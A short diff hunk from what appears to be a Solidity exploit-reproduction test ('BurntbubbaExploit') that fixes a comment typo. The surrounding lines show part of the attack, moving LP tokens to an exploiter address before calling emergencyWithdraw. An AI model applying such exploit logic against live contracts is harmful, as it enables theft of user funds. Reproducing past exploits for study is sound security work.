@@ -141,7 +141,7 @@ contract BurntbubbaExploit is BaseTestWithBalanceLog {
         uint256 totalShares = FarmingLPToken.totalShares();
         uint256 transferAmount =
             FarmingLPToken.balanceOf(address(this)) - ((value * totalShares) / totalWithdrawableLPs);
-        // In the attack tx amount of LPToken was transfered to exploiter eoa addr before making call to
+        // In the attack tx amount of LPToken was transferred to exploiter eoa addr before making call to
         // 'emergencyWithdraw'
         FarmingLPToken.transfer(toAddr, transferAmount);
         FarmingLPToken.emergencyWithdraw(address(this));
